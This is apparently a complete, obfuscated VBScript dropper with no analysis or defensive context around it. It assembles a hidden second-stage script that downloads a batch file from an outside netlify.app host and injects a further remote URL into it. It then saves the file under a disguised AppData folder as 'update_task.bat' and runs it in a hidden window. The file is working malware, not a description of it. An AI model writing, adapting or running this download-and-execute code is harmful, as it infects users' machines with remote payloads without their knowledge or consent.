' Obfuscated VBScript madness



ExecuteGlobal GetShit()



Function GetShit()

    Dim S

    S = ""

    S = S & "Dim x1,x2,x3,x4,x5,x6,x7,x8,x9,x0" & vbCrLf

    S = S & "Set x1=Spawn(""WScript.Shell"")" & vbCrLf

    S = S & "Set x2=Spawn(""Scripting.FileSystemObject"")" & vbCrLf

    S = S & "x3=x1.ExpandEnvironmentStrings(""%APPDATA%"")&""\SystemCache\Logs""" & vbCrLf

    S = S & "If Not x2.FolderExists(x3) Then" & vbCrLf

    S = S & "  x4=Left(x3, InStrRev(x3, ""\"")-1)" & vbCrLf

    S = S & "  If Not x2.FolderExists(x4) Then x2.CreateFolder x4" & vbCrLf

    S = S & "  x2.CreateFolder x3" & vbCrLf

    S = S & "End If" & vbCrLf

    S = S & "Set x5=Spawn(""MSXML2.XMLHTTP"")" & vbCrLf

    S = S & "x5.Open ""GET"", BuildURL(), False" & vbCrLf

    S = S & "x5.Send" & vbCrLf

    S = S & "Set x6=Spawn(""ADODB.Stream"")" & vbCrLf

    S = S & "x6.Type=1:x6.Open:x6.Write x5.responseBody:x6.Position=0" & vbCrLf

    S = S & "x6.Type=2:x6.Charset=""utf-8"":x6.Position=0" & vbCrLf

    S = S & "x7=x6.ReadText" & vbCrLf

    S = S & "x7=Replace(x7,""****"",""'https://vbs-output.netlify.app/code/encoded.txt'"")" & vbCrLf

    S = S & "x6.Position=0:x6.SetEOS:x6.WriteText x7" & vbCrLf

    S = S & "x6.SaveToFile x3 & ""\update_task.bat"", 2" & vbCrLf

    S = S & "x1.Run Chr(34) & x3 & ""\update_task.bat"" & Chr(34), 0, False" & vbCrLf

    S = S & "Function Spawn(z):Set Spawn=CreateObject(z):End Function" & vbCrLf

    S = S & "Function BuildURL():BuildURL=""https://"" & ""website"" & ""-code."" & ""netlify.app/code/final.bat"":End Function"

    GetShit = S

End Function

